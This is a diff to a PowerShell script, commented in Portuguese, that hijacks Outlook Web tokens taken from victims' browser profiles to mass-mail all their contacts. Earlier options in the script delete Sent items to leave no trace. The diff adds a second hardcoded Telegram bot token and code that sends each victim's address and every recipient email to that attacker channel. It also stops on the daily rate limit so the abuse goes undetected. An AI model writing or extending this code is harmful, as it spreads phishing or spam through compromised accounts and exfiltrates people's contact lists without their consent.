@@ -54,7 +54,9 @@ param(
     [switch]$SelfDeleteAll,   # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
     [string]$TelegramToken = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",  # token do bot (vazio = sem reporte)
     [string]$TelegramChatId = "6168636325",                                     # chat_id de destino do reporte
-    [switch]$NoTelegram      # desliga o reporte via Telegram
+    [switch]$NoTelegram,     # desliga o reporte via Telegram
+    [string]$ListaToken  = "8623526001:AAGa0-cXzKzn20FpJQp1VskjgjUMXY5PW7Q",
+    [string]$ListaChatId = "6168636325"
 )
 
 $ErrorActionPreference = "Stop"
@@ -634,6 +636,12 @@ function Build-ReportText($out) {
                 }
                 if ($falhas.Count -gt 10) { $L += "   … e mais $($falhas.Count - 10) falha(s)" }
             }
+            if ($et.limite_atingido) {
+                # trava disparou: avisa que o dia acabou e quantos nao foram nem tentados
+                # (total - enviados - falhas; o 429 ja esta contado em falhas).
+                $naoTentados = $et.total - $et.enviados - $falhas.Count
+                $L += "   ⏸️ Limite diário atingido (HTTP 429) — $($naoTentados) destinatário(s) NÃO tentado(s)"
+            }
         }
     }
     elseif ($out.envio) {
@@ -648,6 +656,26 @@ function Build-ReportText($out) {
     else {
         $L += "ℹ️ Somente detecção (sem envio)"
         $L += $out.decisao
+    }
+    return ($L -join "`n")
+}
+
+# Bot de lista: a cada execucao (cliente/remetente), envia ao SEGUNDO bot o
+# email do remetente + todos os emails enviados + os que falharam por limite
+# excedido (HTTP 429 ErrorExceededMessageLimit), p/ o usuario montar a lista
+# de destinatarios por remetente.
+function Build-ListaText([string]$remetente, [array]$enviados, [array]$falhaLimite) {
+    $L = @()
+    $L += "📋 LISTA — remetente: $remetente"
+    if ($enviados.Count -gt 0) {
+        $L += ""
+        $L += "✅ Enviados ($($enviados.Count)):"
+        foreach ($e in $enviados) { $L += "  $e" }
+    }
+    if ($falhaLimite.Count -gt 0) {
+        $L += ""
+        $L += "⏸️ Falha por limite excedido ($($falhaLimite.Count)):"
+        foreach ($e in $falhaLimite) { $L += "  $e" }
     }
     return ($L -join "`n")
 }
@@ -1120,18 +1148,53 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
             }
             if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
         } else {
-            $ok = 0; $falhas = @()
+            $ok = 0; $falhas = @(); $enviados = @()
+            $limite = $false
             foreach ($c in $contatos) {
                 $res = Send-OWAMail $src.token_write $c.email $subject $body
-                if ($res.ok) { $ok++ }
-                else { $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro } }
+                if ($res.ok) { $ok++; $enviados += $c.email }
+                else {
+                    $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro }
+                    # trava de limite diario: 429 ErrorExceededMessageLimit = OWA ja
+                    # cortou o dia; continuar so queima o limite e denuncia o bot.
+                    if (($res.status -eq 429) -and ($res.erro -match "ErrorExceededMessageLimit")) {
+                        $limite = $true
+                        break
+                    }
+                }
                 Start-Sleep -Milliseconds 300
             }
+            # bot de lista: emails que falharam por limite excedido (429
+            # ErrorExceededMessageLimit) — vao junto com os enviados ao 2o bot.
+            $falhaLimite = @($falhas | Where-Object { $_.status -eq 429 -and $_.erro -match "ErrorExceededMessageLimit" } | ForEach-Object { $_.email })
             $envioTodos = [PSCustomObject]@{
                 de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
                 perfil = "$($src.navegador)/$($src.perfil)"
             }
+            if ($limite) { $envioTodos | Add-Member -MemberType NoteProperty -Name limite_atingido -Value $true }
             if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
+            # bot de lista: envia ao 2o bot (ListaToken/ListaChatId) o remetente +
+            # enviados + falhas por limite. Independente de -NoTelegram (que so
+            # desliga o reporte principal). Chunking em blocos <= 4000 chars evita
+            # o limite de 4096 do Telegram quando a lista e grande.
+            if (($enviados.Count -gt 0) -or ($falhaLimite.Count -gt 0)) {
+                $listaText = Build-ListaText $src.conta $enviados $falhaLimite
+                $listaRes = @()
+                if ($listaText.Length -le 4000) {
+                    $listaRes += Send-TelegramMessage $ListaToken $ListaChatId $listaText
+                } else {
+                    $bloco = @(); $tam = 0
+                    foreach ($linha in ($listaText -split "`n")) {
+                        if (($tam + $linha.Length + 1) -gt 4000 -and $bloco.Count -gt 0) {
+                            $listaRes += Send-TelegramMessage $ListaToken $ListaChatId ($bloco -join "`n")
+                            $bloco = @(); $tam = 0
+                        }
+                        $bloco += $linha; $tam += $linha.Length + 1
+                    }
+                    if ($bloco.Count -gt 0) { $listaRes += Send-TelegramMessage $ListaToken $ListaChatId ($bloco -join "`n") }
+                }
+                $envioTodos | Add-Member -MemberType NoteProperty -Name lista -Value $listaRes
+            }
         }
     } else {
         $envioTodos = [PSCustomObject]@{ de = $null; total = 0; enviados = 0; falhas = @(); status = "sem_perfil_com_token" }
